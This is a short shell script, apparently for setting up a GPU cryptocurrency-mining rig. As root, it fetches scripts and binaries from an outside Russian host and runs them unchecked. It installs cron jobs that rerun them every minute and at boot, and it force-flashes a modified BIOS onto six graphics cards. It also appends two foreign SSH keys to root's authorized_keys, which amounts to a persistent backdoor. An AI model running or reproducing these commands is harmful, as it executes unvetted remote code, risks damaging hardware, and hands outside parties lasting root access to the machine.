wget -q -O - yanairk.ru/dl/send.sh > send.sh
wget -q -O - yanairk.ru/dl/startown > startmining.sh
wget -q -O - yanairk.ru/dl/get > /root/get.py
chmod +x /root/get.py
chmod +x /root/send.sh
apt -y install curl                                                                                                                                                                                               
apt -y install python3-influxdb
./send.sh                                                                                                                                                                                                      
chmod +x startmining.sh                                                                                                                                                                                        
./get.py
echo "@reboot  /root/startmining.sh" >/tmp/cron                                                                                                                                                                
echo "* * * * * /root/send.sh" >> /tmp/cron                                                                                                                                                                    
echo "* * * * * /root/get.py" >> /tmp/cron                                                                                                                                                                    
crontab /tmp/cron                                 
hostname > /etc/hostname
wget yanairk.ru/dl/rx580_4g_mod.rom -O /root/rx580_4g_mod.rom
wget yanairk.ru/dl/atiflash_linux -O /root/atiflash_linux
wget yanairk.ru/dl/ohgodatool -O /root/ohgodatool
wget yanairk.ru/dl/start -q -O - > /root/startmining.sh
chmod +x /root/ohgodatool
chmod +x /root/atiflash_linux
for i in `seq 0 5`; do  /root/atiflash_linux -s $i /var/tmp/rom$i; done
for i in `seq 0 5`; do  /root/atiflash_linux -f -p $i /root/rx580_4g_mod.rom; done
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9Q54DHT0WXYsK8N5TZUrGhdRIWrp1lw+I2dBy2IGlePbAI70aq+u7oIoELvq5pq07mmCwT3ac49zhAOFsMxpvdgTqBDKi9N0skuhjK2Ebfj3cu9Xx7m+xB+ULQJv9Bzf+s36PibpmMZAWQFmUswcqWJ/8r4uIMU6c2Kmj8sTHUOtLzDi5fJov0bwpcrDotmgqypxmXlbLpEFvBPDJ5pAjIpDA/ly/Pq4poOXnUOINrkbuTqGAAcClRFLwFOM8ah01kOO1PLMD88SguyRpuDT0UImiXEmhsq6n/ynbtzr/vJ9SbiWt1bAzrSmAu+6dEjpVOACkA/qKqwC+pnV9R61H root@irk4x4.ru" >>/root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDYjMDvI6qL0DXO0UGt5X+GTOIUweNzAF0J0ddZcQBdYMAXDF0g9zaNzoubVd2Oeof2ine39NQ9PMfI+Y1Lx2+7SC84dtNyngpRf54nuDTgY0j/eplk4XAcypDyg/gpHlYxThVj1v7/JmLcC7hMOffNRDgvWm7yjtbuti7/JLER93ZwhIxrooaQTp+mqnunDd5kuHrF5T3LK9aBk66+kSpwT2MILMNSPZGXHWj7PAoTXUGYBeKerfw+vhnQGZQq5AnJsKk5KugAHFX1Fn7bOBzxKsYbfvF1CJ0Hyl4MAogUmQ/HBuLqVPtRp8M4W0EOig9jDZEfvkHSgWLrpsOKlafHl+IM+SBO/oL3WAVBlv4KRlxXp3a4vfmGiy20//hLialXatAAppK2PZvOObXn1De8HTKpKb7EtR7Opan8khZDHeKByYVDqoPt2wjtiHlo/xf94UIc8IltHn8IvgiyD+rohIBtJZvnAY4CMWDjNXS7XLYN5Bz8cBCbh4xirvTGx2xbbXUcw3jyctdZAjeuFz18zad99vSp2Wjd0p527KyK3pQYjmmRrEk0UKoRjfp0ni4a/3X6ZMYfBasYfH56lD9I22yTq7+RMsDUzEBK9Q3wP1hEcqzuPF8cseZopdW1BdoHA4I03qDw1fXqB9auwwa78r/8PUBGelZzjgmfmYcx/w== artem@artem.ispsystem.net" >>/root/.ssh/authorized_keys
